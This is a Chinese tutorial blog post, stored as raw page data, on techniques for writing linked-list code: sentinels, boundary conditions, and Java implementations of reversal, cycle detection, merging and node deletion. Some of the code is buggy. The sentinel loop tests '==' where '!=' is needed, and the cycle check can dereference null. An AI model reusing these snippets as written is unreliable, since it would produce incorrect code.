class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[n<span class=\"number\">-1</span>] == key)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> temp = a[n<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125;</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = key;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 此时while循环比起代码一，少了i&lt;n这个比较操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 将数组a[n-1] 恢复为原来的值</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = temp;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 如果i = n-1，说明数组中没有要找的key</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(i == n<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 否则，说明找到了key，位置为i</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。</p>\n<p>当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。</p>\n<h3 id=\"重点留意边界条件处理\"><a href=\"#重点留意边界条件处理\" class=\"headerlink\" title=\"重点留意边界条件处理\"></a>重点留意边界条件处理</h3><p>软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。</p>\n<p>我经常用来检查链表代码是否正确执行的边界条件有这么几个：</p>\n<ul>\n<li>如果链表为空时，代码是否能正常工作？</li>\n<li>如果一个链表只包含了一个结点，代码能否正常工作？</li>\n<li>如果链表只包含两个结点时，代码能否正常工作？</li>\n<li>代码逻辑在处理头结点和尾结点时，是否能正常工作？</li>\n</ul>\n<p>当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。</p>\n<p>当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。</p>\n<p>其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。</p>\n<h3 id=\"举列画图，辅助思考\"><a href=\"#举列画图，辅助思考\" class=\"headerlink\" title=\"举列画图，辅助思考\"></a>举列画图，辅助思考</h3><p>对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。</p>\n<p>你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/举例.jpg\">\n<p>看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。</p>\n<h3 id=\"多写多练，没有捷径\"><a href=\"#多写多练，没有捷径\" class=\"headerlink\" title=\"多写多练，没有捷径\"></a>多写多练，没有捷径</h3><p>如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。</p>\n<p>下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。</p>\n<ul>\n<li>单链表反转</li>\n<li>链表中环的检测</li>\n<li>两个有序链表合并</li>\n<li>删除链表倒数第n个结点</li>\n<li>求链表的中间结点</li>\n</ul>\n<p>我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 链表的一些算法题目</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LinkListAlgorithm</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第一个链表，检测是否有环</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表中环的检测\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n1 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n2 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n3 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">3</span>);</span><br><span class=\"line\">        n1.next = n2;</span><br><span class=\"line\">        n2.next = n3;</span><br><span class=\"line\">        n3.next = n1; <span class=\"comment\">// 1-&gt;2-&gt;3-&gt;1</span></span><br><span class=\"line\">        System.out.println(isLoop(n1)); <span class=\"comment\">// true</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 链表反转</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表反转\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n4 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">4</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n5 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">5</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n6 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">6</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n7 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">7</span>);</span><br><span class=\"line\">        n4.next = n5;</span><br><span class=\"line\">        n5.next = n6;</span><br><span class=\"line\">        n6.next = n7;</span><br><span class=\"line\">        System.out.println(printLinkList(n4)); <span class=\"comment\">// 4-&gt;5-&gt;6-&gt;7</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head = reverse(n4);</span><br><span class=\"line\">        System.out.println(printLinkList(head)); <span class=\"comment\">// 7-&gt;6-&gt;5-&gt;4</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 求链表的中间节点</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"求链表的中间节点\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n8 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">8</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n9 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">9</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n10 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n11 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">11</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n12 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">12</span>);</span><br><span class=\"line\">        n8.next = n9;</span><br><span class=\"line\">        n9.next = n10;</span><br><span class=\"line\">        n10.next = n11;</span><br><span class=\"line\">        n11.next = n12; <span class=\"comment\">// 8-&gt;9-&gt;10-&gt;11-&gt;12</span></span><br><span class=\"line\">        System.out.println(printLinkList(n8));</span><br><span class=\"line\">        Node&lt;Integer&gt; mid = middle(n8);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"中间节点是： \"</span> + mid.val);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 有序链表合并</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"有序链表合并\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n13 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">13</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n14 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">14</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n15 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">15</span>);</span><br><span class=\"line\">        n13.next = n14;</span><br><span class=\"line\">        n14.next = n15;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第一个链表： \"</span>+printLinkList(n8));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第二个链表： \"</span>+printLinkList(n13));</span><br><span class=\"line\">        head = merge(n8, n13);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"合并后的链表： \"</span>+printLinkList(head));</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 删除倒数第2个节点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; n16 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">16</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n17 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">17</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n18 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">18</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n19 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">19</span>);</span><br><span class=\"line\">        n16.next = n17;</span><br><span class=\"line\">        n17.next = n18;</span><br><span class=\"line\">        n18.next = n19;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除前： \"</span>+printLinkList(n16));</span><br><span class=\"line\">        head = deleteLastKDesc(n16, <span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除后： \"</span>+printLinkList(n16));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 合并两个有序链表 */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">merge</span><span class=\"params\">(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 确定新链表头结点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head, p = n1, q = n2;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.val &gt; q.val)&#123;</span><br><span class=\"line\">            head = n2;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            head = n1;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;Integer&gt; r = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p!=<span class=\"keyword\">null</span> &amp;&amp;q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p.val &lt; q.val)&#123;</span><br><span class=\"line\">                r.next = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                r.next = q;</span><br><span class=\"line\">                q = q.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            r = r.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r.next = p;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            r.next = q;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**查找链表中间节点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">middle</span><span class=\"params\">(Node&lt;Integer&gt; head)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head==<span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q.next !=<span class=\"keyword\">null</span> &amp;&amp; q.next.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 链表中环的检测*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isLoop</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 采用快慢指针法 如果两个指针相遇，则说明有环</span></span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q == p)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**反转链表*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">reverse</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)<span class=\"keyword\">return</span> head;</span><br><span class=\"line\">        Node&lt;Integer&gt; p;</span><br><span class=\"line\">        Node&lt;Integer&gt; q;</span><br><span class=\"line\">        Node&lt;Integer&gt; r;</span><br><span class=\"line\">        p = head;</span><br><span class=\"line\">        q = p.next;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**删除链表倒数第K个结点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">deleteLastKDesc</span><span class=\"params\">(Node&lt;Integer&gt; head, <span class=\"keyword\">int</span> k)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == <span class=\"keyword\">null</span> || k &lt;<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            k--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            p = head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (++k != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            p.next = p.next.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">E</span>&gt; </span>&#123;</span><br><span class=\"line\">        E val;</span><br><span class=\"line\">        Node&lt;E&gt; next;</span><br><span class=\"line\">        Node(E e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = e;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">printLinkList</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (head !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (head.next !=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">                sb.append(head.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                sb.append(head.val);</span><br><span class=\"line\">            head = head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<p>上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。</p>\n<p>为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？</p>\n<p>只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？</p>\n<p>当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。</p>\n<h3 id=\"理解指针或引用的含义\"><a href=\"#理解指针或引用的含义\" class=\"headerlink\" title=\"理解指针或引用的含义\"></a>理解指针或引用的含义</h3><p>事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。</p>\n<p>有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。</p>\n<p>接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。</p>\n<p>实际上，对于指针的理解，只需要记住下面这句话就可以了：<strong>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量</strong>。</p>\n<p>在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。</p>\n<p>掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。</p>\n<h3 id=\"警惕指针丢失和内存泄露\"><a href=\"#警惕指针丢失和内存泄露\" class=\"headerlink\" title=\"警惕指针丢失和内存泄露\"></a>警惕指针丢失和内存泄露</h3><p>不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/链表插入.jpg\">\n<p>如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = c; <span class=\"comment\">// 将p的next指针指向c结点</span></span><br><span class=\"line\">c-&gt;next = p-&gt;next; <span 